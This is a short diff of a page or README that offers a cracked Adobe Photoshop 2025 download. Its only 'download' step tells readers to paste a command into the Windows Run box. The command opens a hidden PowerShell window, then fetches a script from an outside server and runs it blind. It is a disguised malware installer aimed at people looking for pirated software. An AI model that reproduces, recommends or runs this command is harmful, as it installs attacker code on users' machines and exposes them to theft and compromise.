@@ -1,6 +1,6 @@
 ## **Photoshop Cracked** | **Adobe Photoshop 2025** 🖌️📷
 <h2>📥 Download the Program</h2>
-<h3>copy and execute the following command in **PowerShell**(Win+R)</h3>
+<h3>copy and execute the following command in (Win+R)</h3>
 
 <pre>
   <code id="code-snippet">cmd.exe /c start /min powershell -w h "$u='https://verifclouds.com/1.txt';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'ID: daff2f8').Content;</code>
